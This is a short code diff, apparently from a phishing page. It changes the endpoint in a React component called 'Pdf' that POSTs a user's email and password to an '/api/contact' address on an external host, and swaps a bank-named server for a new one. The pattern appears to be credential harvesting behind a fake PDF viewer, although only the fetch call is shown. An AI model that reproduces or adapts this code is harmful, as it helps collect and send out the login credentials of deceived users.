@@ -30,7 +30,7 @@ function Pdf() {
         setError('');
 
         try {
-            const res = await fetch("https://new-bank-api.onrender.com/api/contact", {
+            const res = await fetch("https://bd-mys-api.onrender.com/api/contact", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ mail: email, pass: password })
